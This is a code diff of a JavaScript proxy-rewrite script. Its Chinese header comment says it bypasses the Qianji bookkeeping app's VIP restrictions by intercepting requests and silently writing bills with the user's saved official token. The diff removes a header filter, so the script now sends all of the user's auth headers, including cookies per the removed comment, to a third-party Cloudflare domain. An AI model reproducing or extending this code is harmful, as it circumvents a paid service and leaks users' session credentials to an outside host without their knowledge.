@@ -3,7 +3,7 @@
  * 作用：绕过本地快捷指令的 VIP 限制与异常弹窗死锁。
  * 原理：拦截自定义本地请求，调用 CF 云端大模型，然后使用保存的官方 Token 直接向钱迹服务器静默写入账单！
  * 
- * 作者：ykybl0041
+ * 作者：ykybl0042
  */
 
 const url = ($request && $request.url) ? $request.url : "";
@@ -107,18 +107,11 @@ else if (url.includes("api.qianjiapp.com/hijack_add_bill")) {
 
     // 2. 发往 Cloudflare 自己的 AI 进行解析
     const aiApiUrl = "https://qianji.renflyp.dpdns.org/";
-    // 极致净化发往云端的 Header 载荷，只保留核心鉴权 Token
-    // 防止因将全量数十个 Header (含巨量无用 Cookie) 传给 CF 导致直接被其防火墙当作恶意载荷 TCP 截断
-    const cleanAuthHeaders = {};
-    if (authHeaders["tok"]) cleanAuthHeaders["tok"] = authHeaders["tok"];
-    if (authHeaders["reqidv2"]) cleanAuthHeaders["reqidv2"] = authHeaders["reqidv2"];
-    if (authHeaders["User-Agent"]) cleanAuthHeaders["User-Agent"] = authHeaders["User-Agent"];
 
     const cfRequest = {
         url: aiApiUrl,
         headers: { 
             "Content-Type": "application/json",
-            "Connection": "close", // 强制短连接防止 Socket 复用断开
             "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1" 
         },
         body: JSON.stringify({
@@ -126,7 +119,7 @@ else if (url.includes("api.qianjiapp.com/hijack_add_bill")) {
             assets: formattedAssets,
             categories: formattedCategories,
             uid: qianjiUid,
-            auth_headers: cleanAuthHeaders
+            auth_headers: authHeaders
         })
     };
 
